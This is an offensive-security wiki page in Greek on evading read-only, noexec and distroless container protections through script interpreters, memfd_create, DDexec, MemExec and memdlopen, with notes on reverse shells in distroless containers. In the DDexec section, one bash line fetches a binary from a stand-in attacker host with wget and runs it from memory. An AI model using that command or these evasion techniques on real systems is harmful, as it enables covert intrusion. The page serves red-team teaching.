# Παράκαμψη προστασιών FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Βίντεο

Στα παρακάτω βίντεο παρουσιάζονται με περισσότερες λεπτομέρειες οι τεχνικές που αναφέρονται σε αυτή τη σελίδα:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## σενάριο read-only / no-exec

Σε ένα container, μπορείτε να προσαρτήσετε το root filesystem ως read-only ορίζοντας **`readOnlyRootFilesystem: true`** στο security context.<sup>[[3]](#references)</sup> Για παράδειγμα:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ένα root filesystem μόνο για ανάγνωση δεν κάνει τα ξεχωριστά προσαρτημένα volumes μόνο για ανάγνωση. Το Docker αντιμετωπίζει το **`/dev/shm`** ως IPC mount, ενώ επιλογές tmpfs όπως `rw` και `noexec` αποτελούν ρυθμίσεις κατά την εκτέλεση· ελέγξτε τις επιλογές mount του container-στόχου προτού βασιστείτε σε κάποια από αυτές τις συμπεριφορές.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Από την οπτική του red team, αυτός ο συνδυασμός μπορεί να δυσκολέψει τη λήψη και εκτέλεση binaries που δεν είναι ήδη διαθέσιμα (για παράδειγμα, backdoors ή εργαλεία enumeration).<sup>[[4]](#references)[[5]](#references)</sup>

## Ευκολότερη παράκαμψη: Scripts

Ένα mount `noexec` εμποδίζει την άμεση εκτέλεση binaries από αυτό το mount, αλλά ένας interpreter εξακολουθεί να μπορεί να διαβάσει και να εκτελέσει ένα script. Επομένως, αν υπάρχει `sh` ή `python`, μπορείτε να εκτελέσετε ένα shell ή Python script μέσω αυτού του interpreter.<sup>[[5]](#references)</sup>

Αυτό δεν βοηθά όταν το ίδιο το απαιτούμενο εργαλείο είναι binary.<sup>[[5]](#references)</sup>

## Παρακάμψεις μέσω μνήμης

Όταν εμποδίζεται η άμεση εκτέλεση από μια διαδρομή mount, μία επιλογή είναι να φορτωθεί το ELF στη μνήμη και να εκτελεστεί μέσω μιας διαδρομής που βασίζεται στη μνήμη. Έτσι παρακάμπτεται ο έλεγχος `noexec` αυτού του mount, αλλά δεν καταργούνται άλλοι έλεγχοι του kernel, δικαιωμάτων ή πολιτικών.<sup>[[5]](#references)[[6]](#references)</sup>

### Παράκαμψη FD + exec syscall

Αν ένα scripting runtime μπορεί να προσπελάσει το σχετικό Linux interface, μπορεί να δημιουργήσει έναν ανώνυμο file descriptor που υποστηρίζεται από RAM, με **`memfd_create(2)`**, να γράψει σε αυτόν τα bytes του ELF και να χρησιμοποιήσει μια διαδρομή εκτέλεσης μέσω fd. Το project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) δημιουργεί συμπιεσμένο κώδικα Python, Perl ή Ruby, κωδικοποιημένο σε base64, για αυτή τη ροή εργασίας.<sup>[[6]](#references)[[7]](#references)</sup>

Το project τεκμηριώνει προς το παρόν στόχους Python, Perl και Ruby· για PHP ή Node απαιτείται διαφορετική, ειδική για το runtime τεχνική ή επέκταση, επομένως η απουσία αυτού του generator για μια γλώσσα δεν σημαίνει ότι είναι αδύνατη η εκτέλεση μέσω μνήμης.<sup>[[6]](#references)[[12]](#references)</sup>

Δείτε το [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) για ευρύτερη κάλυψη της εκτέλεσης μέσω ανώνυμων αρχείων, σχετικών μοτίβων staging και της ανίχνευσης και συλλογής forensic στοιχείων.

> [!WARNING]
> Ένα κανονικό εκτελέσιμο αρχείο που γράφεται στο **`/dev/shm`** εξακολουθεί να υπόκειται στη ρύθμιση **`noexec`** αυτού του mount· το απλό άνοιγμά του μέσω ενός συνηθισμένου file descriptor δεν αλλάζει την πολιτική του mount.<sup>[[5]](#references)</sup>
>
> Η ακριβής μέθοδος εκτέλεσης μέσω μνήμης εξαρτάται επίσης από το runtime, την αρχιτεκτονική, τον kernel και τα διαθέσιμα δικαιώματα.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

Το [**DDexec / EverythingExec**](https://github.com/arget13/DDexec) γράφει έναν stager και loader στη διεργασία του shell που εκτελείται, μέσω του **`/proc/self/mem`**, και έπειτα μεταβιβάζει τον έλεγχο σε αυτόν τον κώδικα.<sup>[[8]](#references)</sup>

Έτσι, η διεργασία μπορεί να φορτώσει ένα παρεχόμενο binary χωρίς να το τοποθετήσει πρώτα σε filesystem με δικαίωμα εκτέλεσης.<sup>[[8]](#references)</sup>

> [!TIP]
> Το **DDexec / EverythingExec** μπορεί να φορτώσει και να **εκτελέσει** shellcode ή ένα binary από τη **μνήμη**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, δείτε το Github ή:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

Το [**Memexec**](https://github.com/arget13/memexec) είναι μια υλοποίηση του DDexec που εκτελείται ως daemon. Ο daemon ακούει αιτήματα που περιέχουν ορίσματα και ακατέργαστα bytes προγράμματος, δημιουργεί ένα child process για τη φόρτωση και εκτέλεση κάθε προγράμματος και διατηρεί το parent process ως server.<sup>[[9]](#references)</sup>

Το repository περιλαμβάνει ένα παράδειγμα χρήσης του **memexec για εκτέλεση binaries από ένα PHP reverse shell** στο [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Με σκοπό παρόμοιο με αυτόν του DDexec, το [**memdlopen**](https://github.com/arget13/memdlopen) είναι μια fileless υλοποίηση του `dlopen()` για shared object ή πρόγραμμα. Το README του τεκμηριώνει αυτή τη στιγμή υποστήριξη ARM64, οπότε ελέγξτε την αρχιτεκτονική του στόχου πριν το χρησιμοποιήσετε.<sup>[[10]](#references)</sup>

## Distroless Bypass

Για μια ειδική εξήγηση σχετικά με το **τι ακριβώς είναι το distroless**, πότε είναι χρήσιμο και πότε όχι, καθώς και πώς αλλάζει το post-exploitation tradecraft σε containers, δείτε:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Τι είναι το distroless

Οι distroless images περιέχουν μόνο την εφαρμογή και τις εξαρτήσεις του runtime της· οι επίσημες images παραλείπουν package managers, shells και άλλα προγράμματα που αναμένονται σε μια τυπική διανομή Linux.<sup>[[11]](#references)</sup>

Ο περιορισμός της runtime image σε αυτές τις εξαρτήσεις μειώνει το λογισμικό που υπάρχει σε production, καθώς και την ποσότητα που πρέπει να σαρώνεται και να παρακολουθείται.<sup>[[11]](#references)</sup>

### Reverse Shell

Σε ένα distroless container μπορεί **να μη βρείτε `sh` ή `bash`** για ένα κανονικό shell, ούτε συνηθισμένα utilities όπως τα `ls`, `whoami` ή `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Επομένως, ένα συνηθισμένο reverse shell που βασίζεται σε shell ή enumeration που βασίζεται σε utilities ενδέχεται να μη λειτουργήσει.<sup>[[11]](#references)</sup>

Αν η εφαρμογή που έχει παραβιαστεί περιλαμβάνει runtime γλώσσας (για παράδειγμα, Python για μια εφαρμογή Flask ή Node.js για μια εφαρμογή Node), ένα RCE μπορεί και πάλι να αξιοποιήσει αυτό το runtime για command channel και επιθεώρηση του συστήματος μέσω των API του.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Χρησιμοποιήστε τη διαθέσιμη γλώσσα scripting για να **κάνετε enumeration του συστήματος** μέσω των δυνατοτήτων της.<sup>[[12]](#references)</sup>

Αν δεν υπάρχουν προστασίες **read-only/no-exec**, ένα command channel μπορεί να γράψει binaries σε ένα writable, executable mount και να τα εκτελέσει· επαληθεύστε πρώτα τις επιλογές του mount και τα permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Όταν υπάρχουν αυτές οι προστασίες, χρησιμοποιήστε τις **τεχνικές εκτέλεσης από τη μνήμη που αναφέρθηκαν παραπάνω**, εφόσον το επιτρέπουν το runtime, ο kernel και τα permissions.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Μπορείτε να βρείτε **παραδείγματα** εκμετάλλευσης ευπαθειών RCE για την απόκτηση **reverse shells** μέσω γλωσσών scripting και την εκτέλεση binaries από τη μνήμη στο [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Εξερεύνηση χειρισμού μνήμης Linux για απόκρυψη και αποφυγή εντοπισμού](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Αόρατες εισβολές με DDexec-ng & dlopen() στη μνήμη - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Ρύθμιση Security Context για Pod ή Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
